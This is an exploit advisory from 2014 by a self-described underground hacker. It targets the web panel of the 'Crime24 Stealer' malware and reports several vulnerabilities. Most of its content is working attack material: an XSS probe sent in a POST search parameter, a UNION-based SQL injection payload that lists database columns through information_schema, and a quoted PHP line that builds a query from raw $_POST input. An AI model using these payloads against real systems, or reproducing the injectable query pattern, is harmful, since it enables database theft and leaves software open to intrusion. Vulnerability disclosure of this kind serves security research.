


Type: SQL Injection

Author:  [DaisukeDan](https://twitter.com/TheHackersBay)

```
#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
#  ____        _           _          ____              
# |  _ \  __ _(_)___ _   _| | _____  |  _ \  __ _ _ __   
# | | | |/ _` | / __| | | | |/ / _ \ | | | |/ _` | '_ \  
# | |_| | (_| | \__ \ |_| |   <  __/ | |_| | (_| | | | |
# |____/ \__,_|_|___/\__,_|_|\_\___| |____/ \__,_|_| |_|
#        
#     #CyberNinja | My katana can slay any security!
#         >> Twitter @TheHackersBay
#             >> Pentester / Underground hacker
#
# Exploit Title: Crime24 Stealer Panel <= Multiple Vulnerabilities
# Date: Sunday May 3 2014
# Exploit Author: Daisuke Dan
# Vendor Homepage: Crime24.net
# Download link (v.1): http://thehackersbay.org/blog/patch/Crime24-Stealer.rar
# Version: v.1
# Tested on: Windows Seven
# Patched Version (v.2): http://thehackersbay.org/blog/2014/05/03/crime24-stealer-panel/
#
#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
#=========================== EXPLOITATION ==============================
 
0x01 Detecting the error
 
POST: http://site.com/?action=search
POST Content: q='"><img+src=x+onerror=prompt('DaisukeDan');>&in=1&search=Search
Example: http://i.imgur.com/zyIr5xv.png
Result: Cross site scripting + SQL error
 
 
0x02 Exploit the SQL Injection
 
[+] Vulnerable code:
$result = mysql_query("SELECT * FROM `logs` WHERE `".$cols[$_POST["in"]]."` LIKE '%".$_POST["q"]."%';", $mysql);
 
POST: http://site.com/?action=search                    
POST Content:
q=' union select 1,2,group_concat(column_name,0x0a),4,5,6,7,8 from information_schema.columns where table_name=0x6c6f6773-- -
&in=1&search=Search
Example: http://i.imgur.com/t4ydLsR.png
You have access to all the database.
 
 
#=========================== Gr33tz =============================#
| Raw-x | eth0 | Downfall | XzLt | Insider | rootaccess | Yasker |
| EZiX | Negative | ajkaro | Un0wn_X | H4T | NeTwork | Pent0thal |
#================================================================#
```

